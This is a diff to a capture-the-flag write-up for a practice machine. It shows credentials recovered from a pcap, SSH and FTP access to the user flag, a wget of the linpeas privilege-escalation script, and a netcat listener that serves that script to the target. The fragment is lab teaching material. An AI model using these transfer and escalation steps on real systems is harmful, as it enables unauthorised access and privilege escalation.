@@ -154,7 +154,7 @@ After downloading the pcap file and opening it up in wireshark we find some clea
 
 ![image](https://user-images.githubusercontent.com/105310322/183151371-1ac9a8ca-d2d7-4d9f-93b5-ea69d0465110.png)
 
-Nicely done now we can login through ssh and grab the user flag! (You can also get this flag through ftp by running ```console $ get user.txt -```, however you will not be able to retrieve the root flag)
+Nicely done now we can login through ssh and grab the user flag! (You can also get this flag through ftp by running ```$ get user.txt -```, however you will not be able to retrieve the root flag)
 
 ```console
 ─[us-dedivip-1]─[10.10.14.93]─[htb-0xrogue@pwnbox-base]─[~]
@@ -175,7 +175,7 @@ First lets download it from github. (This following URL also gives good info on 
 ```console
 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
 ```
-By inputting the following commands we can get it to run (```console python -m http.server 80``` is another option since linpeas SimpleHTTPServer was not wokring for me)
+By inputting the following commands we can get it to run (```python -m http.server 80``` is another option since linpeas SimpleHTTPServer was not wokring for me)
 
 ```console
 sudo nc -lvnp 80 < linpeas.sh #Host
